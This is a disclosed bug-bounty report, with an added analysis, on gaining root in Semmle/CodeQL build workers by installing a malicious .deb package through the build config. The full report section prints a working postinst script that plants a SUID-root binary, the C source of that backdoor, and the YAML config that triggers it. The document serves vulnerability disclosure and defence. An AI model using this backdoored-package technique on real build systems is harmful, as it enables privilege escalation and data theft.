# Privilege Escalation in Workers Container via Malicious Package Installation

## Metadata
- **Source:** HackerOne
- **Report:** 692603 | https://hackerone.com/reports/692603
- **Submitted:** 2019-09-11
- **Reporter:** testanull
- **Program:** Semmle (CodeQL)
- **Bounty:** Not specified in report
- **Severity:** Critical
- **Vuln:** Privilege Escalation, Arbitrary Code Execution, Insecure Package Management, Post-Installation Script Exploitation
- **CVEs:** None
- **Category:** auth-crypto

## Summary
The Semmle build system allows users to install arbitrary packages during the prepare step without proper validation, enabling attackers to upload malicious .deb packages with backdoored post-installation scripts. By crafting a package that creates a SUID binary during installation, attackers can gain root access to the worker container and exfiltrate sensitive data.

## Attack scenario
1. Attacker creates a malicious .deb package with a postinst script that compiles a SUID binary capable of executing arbitrary commands as root
2. Attacker uploads the malicious .deb package alongside legitimate source code to the Semmle build system
3. Attacker crafts a build configuration that references the malicious package in the prepare.packages section using a local path (/opt/src/work.deb)
4. During the prepare step, the system installs the malicious package without validation, triggering the postinst script with elevated privileges
5. The postinst script executes, creating a SUID binary (/usr/bin/setpasswd) that grants arbitrary command execution as root
6. Attacker invokes the SUID binary through the after_prepare step or subsequent build phases to execute commands with root privileges

## Root cause
The build system fails to validate package sources and contents before installation, allowing local file paths to be used for package installation. Additionally, post-installation scripts from untrusted packages are executed with elevated privileges without sandboxing or permission restrictions.

## Attacker mindset
An attacker with code upload privileges recognizes that the build system trusts local file paths and executes package post-installation scripts with elevated privileges. By weaponizing standard Debian package mechanisms (postinst scripts), they can establish persistent root access without requiring direct binary uploads.

## Defensive takeaways
- Implement strict package source validation: only allow packages from whitelisted repositories with cryptographic signature verification
- Run package installation and post-installation scripts in isolated containers or with dropped capabilities to prevent privilege escalation
- Scan uploaded source code and referenced packages for known malicious patterns before build execution
- Use read-only filesystems for build artifacts and enforce minimal required permissions for each build step
- Implement audit logging for all package installations and script executions during builds
- Apply principle of least privilege: run build processes with minimal necessary permissions, not as root
- Use package manager security features: enforce hash verification, disable unsigned packages, and use AppArmor/SELinux profiles

## Variant hunting
Check if other build systems (Maven, npm, pip) in the same infrastructure allow installation of packages with untrusted sources
Investigate if environment variables or previous build artifacts can be leveraged to inject malicious packages
Test whether container escape is possible after gaining root in the worker container
Examine if build cache mechanisms could be poisoned with backdoored artifacts for subsequent builds
Verify if the before_prepare step allows similar package installation vectors

## MITRE ATT&CK
- T1190
- T1548
- T1548.001
- T1547
- T1543
- T1059

## Notes
This is a critical vulnerability in a code analysis platform where untrusted users can execute arbitrary code with root privileges. The attack leverages the legitimate package management mechanism (apt) but exploits the lack of validation and sandboxing of post-installation hooks. The PoC demonstrates complete container compromise. The vulnerability is particularly severe because it affects a security-focused platform (Semmle/CodeQL) that users rely on for code analysis.

## Full report
<details><summary>Expand</summary>

## Summary about the bugs:
In the prepare step, semmle allows user to install new package.

By upload a malicious package along with source code and force server to build this package, attacker will gain root access to the container

## Steps:

1. Create a malicious package contains the backdoor:

I use this guide (https://www.offensive-security.com/metasploit-unleashed/binary-linux-trojan/) to create the package.

With the content of ``postinst`` is

```
#!/bin/sh

ps -ef
sudo cp /opt/src/run /suidfs/passwd && sudo chown root:root /suidfs/passwd && sudo chmod 04755 /suidfs/passwd && ln -s /suidfs/passwd /usr/bin/setpasswd && setpasswd id &

```

Content of ``/opt/src/run``:

```
#include <stdio.h>
void main(int argc, char *argv[]) {
    setreuid(0, 0);
    system(argv[1]);
}
```
After that i will got a malicious ``.deb`` package.

2. Create a config file to install this malicious package:

Because the source code is imported before the ``prepare`` step happens, so i will be able to install this package by point directly to it like this ``/opt/src/work.deb``.

The install command now will be like this ``apt install -y --no-recommend /opt/src/work.deb``. And it is ``legal``.

The build config:
```
extraction:
  java:
    prepare:
      packages:
        - /opt/src/work.deb
    after_prepare:
      - echo pwned >> /opt/out/snapshot/log/build.log
      - /usr/bin/setpasswd 'id'
```
After that the build will failed, and attacker will get root on the container by running the setuid backdoor

## PoC is attached below

Thanks & regard!

## Impact

Attacker will get root access and will be able to dump every sensitive datas in the server!

</details>

---
*Analysed by Claude on 2026-05-24*
